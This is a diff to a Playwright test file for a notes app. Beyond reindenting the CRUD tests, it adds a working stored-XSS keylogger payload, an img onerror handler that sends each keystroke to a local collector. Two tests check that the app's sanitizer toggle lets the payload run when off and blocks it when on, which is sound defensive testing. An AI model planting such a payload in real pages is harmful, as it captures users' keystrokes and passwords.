@@ -1,7 +1,13 @@
 import { test, expect, type APIRequestContext, type Page } from '@playwright/test';
+import fs from 'fs';
+import path from 'path';
 
 const API_BASE_URL = 'http://localhost:3001';
 const NOTES_URL = `${API_BASE_URL}/notes`;
+const KEYLOG_PATH = path.resolve(process.cwd(), '../keylog.txt');
+
+const PAYLOAD =
+  `hello <img src=x onerror="document.addEventListener('keydown',function(e){fetch('http://localhost:4000/log',{method:'POST',body:e.key})})"> world`;
 
 type TestUser = {
   name: string;
@@ -152,34 +158,34 @@ test.describe('Notes CRUD flow', () => {
   });
 
   test('updates a note', async ({ page, request }) => {
-  test.setTimeout(15000);
+    test.setTimeout(15000);
 
-  const loginResult = await registerAndLogin(request);
-  const note = await createNote(
-    request,
-    loginResult.token,
-    'Original note before update'
-  );
+    const loginResult = await registerAndLogin(request);
+    const note = await createNote(
+      request,
+      loginResult.token,
+      'Original note before update'
+    );
 
-  await loginInBrowser(page, loginResult);
-  await page.goto('/');
+    await loginInBrowser(page, loginResult);
+    await page.goto('/');
 
-  const noteElement = page.getByTestId(note._id);
-  await expect(noteElement).toBeVisible();
+    const noteElement = page.getByTestId(note._id);
+    await expect(noteElement).toBeVisible();
 
-  await page.getByTestId(`edit-${note._id}`).click();
+    await page.getByTestId(`edit-${note._id}`).click();
 
-  const textarea = page.getByTestId(`text_input-${note._id}`);
-  await expect(textarea).toBeVisible();
+    const textarea = page.getByTestId(`text_input-${note._id}`);
+    await expect(textarea).toBeVisible();
 
-  await textarea.fill('Playwright updated note');
-  await page.getByTestId(`text_input_save-${note._id}`).click();
+    await textarea.fill('Playwright updated note');
+    await page.getByTestId(`text_input_save-${note._id}`).click();
 
-  await expect(page.locator('.notification')).toHaveText('Note updated');
+    await expect(page.locator('.notification')).toHaveText('Note updated');
 
-  await expect(noteElement).toBeVisible();
-  await expect(noteElement).toContainText('Playwright updated note');
-});
+    await expect(noteElement).toBeVisible();
+    await expect(noteElement).toContainText('Playwright updated note');
+  });
 
   test('deletes a note', async ({ page, request }) => {
     const loginResult = await registerAndLogin(request);
@@ -198,25 +204,81 @@ test.describe('Notes CRUD flow', () => {
   });
 
   test('uses the AI helper to generate note text', async ({ page, request }) => {
-  test.setTimeout(30000);
+    test.setTimeout(30000);
 
-  const user = await createUser(request);
-  await loginThroughForm(page, user);
+    const user = await createUser(request);
+    await loginThroughForm(page, user);
 
-  await page.getByTestId('add_new_note').click();
+    await page.getByTestId('add_new_note').click();
 
-  const newNoteInput = page.getByTestId('text_input_new_note');
-  await expect(newNoteInput).toBeVisible();
-  await expect(newNoteInput).toHaveValue('');
+    const newNoteInput = page.getByTestId('text_input_new_note');
+    await expect(newNoteInput).toBeVisible();
+    await expect(newNoteInput).toHaveValue('');
 
-  await page.getByTestId('help_me_write').click();
+    await page.getByTestId('help_me_write').click();
 
-  await page
-    .getByTestId('help_me_write_prompt')
-    .fill('Write a short fun fact based on my notes');
+    await page
+      .getByTestId('help_me_write_prompt')
+      .fill('Write a short fun fact based on my notes');
 
-  await page.getByTestId('help_me_write_submit').click();
+    await page.getByTestId('help_me_write_submit').click();
 
-  await expect(newNoteInput).not.toHaveValue('', { timeout: 30000 });
+    await expect(newNoteInput).not.toHaveValue('', { timeout: 30000 });
+  });
+
+  test('renders rich HTML correctly', async ({ page, request }) => {
+    const loginResult = await registerAndLogin(request);
+
+    const note = await createNote(
+      request,
+      loginResult.token,
+      'Hello <b>world</b>'
+    );
+
+    await page.goto('/');
+
+    const body = page.getByTestId(note._id).getByTestId('note_body');
+
+    await expect(body.locator('b')).toHaveText('world');
+  });
+
+  test('XSS works when sanitizer is OFF', async ({ page, request }) => {
+  fs.writeFileSync(KEYLOG_PATH, '');
+
+  const loginResult = await registerAndLogin(request);
+  await createNote(request, loginResult.token, PAYLOAD);
+
+  await page.goto('/');
+
+  await page.getByTestId('sanitizer_toggle').click();
+
+  await page.waitForTimeout(500);
+
+  await page.keyboard.type('abc');
+
+  await page.waitForTimeout(1000);
+
+  const log = fs.readFileSync(KEYLOG_PATH, 'utf8');
+
+  expect(log).toContain('a');
+  expect(log).toContain('b');
+  expect(log).toContain('c');
 });
+
+  test('XSS is blocked when sanitizer is ON', async ({ page, request }) => {
+    fs.writeFileSync(KEYLOG_PATH, '');
+
+    const loginResult = await registerAndLogin(request);
+    await createNote(request, loginResult.token, PAYLOAD);
+
+    await page.goto('/');
+
+    await page.keyboard.type('abc');
+
+    await page.waitForTimeout(1000);
+
+    const log = fs.readFileSync(KEYLOG_PATH, 'utf8');
+
+    expect(log.trim()).toBe('');
+  });
 });
